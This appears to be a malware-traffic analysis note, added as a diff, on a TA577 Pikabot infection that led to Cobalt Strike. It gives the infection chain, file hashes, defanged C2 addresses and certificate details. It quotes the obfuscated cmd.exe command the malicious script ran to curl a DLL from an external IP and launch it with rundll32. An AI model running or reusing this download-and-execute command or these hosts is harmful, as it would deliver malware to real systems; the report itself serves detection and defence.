@@ -1,0 +1,156 @@
+2023-10-17 (TUESDAY) - TA577 PIKABOT INFECTION WITH COBALT STRIKE
+
+REFERENCE:
+
+- https://twitter.com/Cryptolaemus1/status/1714233359587856620
+
+INFECTION CHAIN:
+
+- email --> link for zip download --> downloaded zip --> extracted .js file --> 
+  retrieves and runs Pikabot installer DLL --> Pikabot C2 --> Cobalt Strike 
+
+NOTES: 
+
+- We see different IOCs for each infection. For example, different sizes/SHA256 hashes for the 
+  downloaded zip archive and extracted .js file.
+- This leads to different URLs for the Pikabot installer DLL and DLL SHA256 hashes/file sizes.
+- The post-infection Pikabot HTTPS C2 traffic has the same IP and ports, but different strings
+  in Pikabot's HTTPS URLs for each infected host.
+- Forensic analysis on the infected host revealed no Cobalt Strike binary saved to disk.
+
+EXAMPLE OF DOWNLOADED ZIP AND EXTRACTED .JS FILE:
+
+- SHA256 hash: f5a88db48c222bdd6a781ebfccd7481b8b785035a1dcbc7e61c35fa407171f96
+- File size: 85,064 bytes
+- File name: ryrm.zip
+- File location: hxxp://cottoncrumbs[.]com/ivll/ --> hxxp://cottoncrumbs[.]com/ivll//?hmQ=1697552196
+- File type: Zip archive data, at least v2.0 to extract, compression method=deflate
+- File description: zip archive downloaded from link in email
+
+- SHA256 hash: 3f6e5e9de5a0e10ddcfe4cf2ba5d405235895989e80170c44966890464f8785b
+- File size: 423,231 bytes
+- File name: opt-324.js
+- File type: ASCII text, with very long lines (65536), with no line terminators
+- File description: .js file extracted fro the above zip archive
+
+COMMANDS RUN BY ABOVE .JS FILE:
+
+  "C:\Windows\System32\cmd.exe" /c XT || ecHo XT &
+  ping XT || CuRL hxxp://128.140.102[.]132/iuvinoB/indus -o %tMP%\XT.log &
+  ping -n 3 XT || RuNDlL32 %tMp%\XT.log, CrashForExceptionExportThunk &
+  exIt gxEHCNWBeFPqZRN
+
+PIKABOT INSTALLER DLL:
+
+- SHA256 hash: 04843a868908ee8ca72493982d7081ee5ee3b00b06376e2992cc73518a20195a
+- File size: 1,394,766 bytes
+- File location: hxxp://128.140.102[.]132/iuvinoB/indus
+- File location: C:\Users\[username]\AppData\Local\Temp\XT.log
+- File type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows
+- File description: Pikabot installer DLL retrieved by above .js file
+- Run method: rundll32.exe [filename], CrashForExceptionExportThunk
+
+INFECTION TRAFFIC:
+
+INITIAL ZIP ARCHIVE DOWNLOAD:
+
+- 162.144.21[.]164 port 80 - hxxp://cottoncrumbs[.]com/ivll/
+- 162.144.21[.]164 port 80 - hxxp://cottoncrumbs[.]com/ivll//?hmQ=1697552196
+
+URL FOR PIKABOT INSTALLER DLL:
+
+- 128.140.102[.]132 port 80 - hxxp://128.140.102[.]132/iuvinoB/indus
+
+PIKABOT POST-INFECTION HTTPS C2 TRAFFIC:
+
+- hxxps://80.85.140[.]43:9785/Caulds/Discepted/EblspiBdKMz?correctitudeUnpermeative=DisavowsMegafog
+- hxxps://80.85.140[.]152:5938/Caulds/Discepted/EblspiBdKMz?correctitudeUnpermeative=DisavowsMegafog
+- hxxps://185.106.94[.]152:13720/Caulds/Discepted/EblspiBdKMz?correctitudeUnpermeative=DisavowsMegafog
+- hxxps://185.106.94[.]167:5631/Caulds/Discepted/EblspiBdKMz?correctitudeUnpermeative=DisavowsMegafog
+- hxxps://185.106.94[.]174:5000/Caulds/Discepted/EblspiBdKMz?correctitudeUnpermeative=DisavowsMegafog
+- hxxps://185.106.94[.]177:13721/Caulds/Discepted/EblspiBdKMz?correctitudeUnpermeative=DisavowsMegafog
+
+- Note: Post-infection IPs & ports are the same each infection, but have different strings in the URLs.
+
+COBALT STRIKE TRAFFIC:
+
+- 45.155.249[.]171 port 443 - ponturded[.]com - HTTPS traffic using Let's Encrypt certificate generated on
+  Monday 2023-10-16 at 17:30:04 UTC
+
+SELF-SIGNED CERTIFICATE FOR PIKABOT C2 SERVER AT 80.85.140[.]43 PORT 9785:
+
+- Subject and Issuer:
+ -- Country: LV
+ -- State/Province: WO
+ -- Organization: Knawels Tarpapers Inc.
+ -- Organizational Unit: Nonnegativistic Canreply
+ -- Locality: Tearjerkers Creditorship
+ -- Common Name: honduranean.forsale
+- Validity:
+ -- Not Before: Thu, 05 Oct 2023 19:23:45 GMT
+ -- Not After: Fri, 04 Oct 2024 19:23:45 GMT
+
+SELF-SIGNED CERTIFICATE FOR PIKABOT C2 SERVER AT 80.85.140[.]152 PORT 5938:
+
+- Subject and Issuer:
+ -- Country: AR
+ -- State/Province: DI
+ -- Organization: Duracine Senaah
+ -- Organizational Unit: Blunderbusses Submersibility
+ -- Locality: Unevinced Thoracodelphus
+ -- Common Name: nonhematic.win
+- Validity:
+ -- Not Before: Thu, 05 Oct 2023 19:23:49 GMT
+ -- Not After: Fri, 04 Oct 2024 19:23:49 GMT
+
+SELF-SIGNED CERTIFICATE FOR PIKABOT C2 SERVER AT 185.106.94[.]152 PORT 13720:
+
+- Subject and Issuer:
+ -- Country: IE
+ -- State/Province: SE
+ -- Organization: Goriness Ketipate Inc.
+ -- Organizational Unit: Jangling Decimate
+ -- Locality: Sonnobuoy
+ -- Common Name: routinish.horse
+- Validity:
+ -- Not Before: Thu, 05 Oct 2023 19:23:29 GMT
+ -- Not After: Fri, 04 Oct 2024 19:23:29 GMT
+
+SELF-SIGNED CERTIFICATE FOR PIKABOT C2 SERVER AT 185.106.94[.]167 PORT 5631:
+
+- Subject and Issuer:
+ -- Country: CA
+ -- State/Province: CL
+ -- Organization: Zeugite Opinional Inc.
+ -- Organizational Unit: Simoon
+ -- Locality: Enshrined Ribroaster
+ -- Common Name: aurang.de
+- Validity:
+ -- Not Before: Thu, 05 Oct 2023 19:23:43 GMT
+ -- Not After: Fri, 04 Oct 2024 19:23:43 GMT
+
+SELF-SIGNED CERTIFICATE FOR PIKABOT C2 SERVER AT 185.106.94[.]174 PORT 5000:
+
+- Subject and Issuer:
+ -- Country: CH
+ -- State/Province: RU
+ -- Organization: Myelocerebellar Bitched
+ -- Organizational Unit: Seroenzyme
+ -- Locality: Cordaitales Cardiorrheuma
+ -- Common Name: nonfungible.pet
+- Validity:
+ -- Not Before: Thu, 05 Oct 2023 19:23:38 GMT
+ -- Not After: Fri, 04 Oct 2024 19:23:38 GMT
+
+SELF-SIGNED CERTIFICATE FOR PIKABOT C2 SERVER AT 185.106.94[.]177 PORT 13721:
+
+- Subject and Issuer:
+ -- Country: SA
+ -- State/Province: GR
+ -- Organization: Arbacin
+ -- Organizational Unit: Protohemipterous
+ -- Locality: Parthenogenetic Mettlesome
+ -- Common Name: slushpit.team
+- Validity:
+ -- Not Before: Thu, 05 Oct 2023 19:23:35 GMT
+ -- Not After: Fri, 04 Oct 2024 19:23:35 GMT
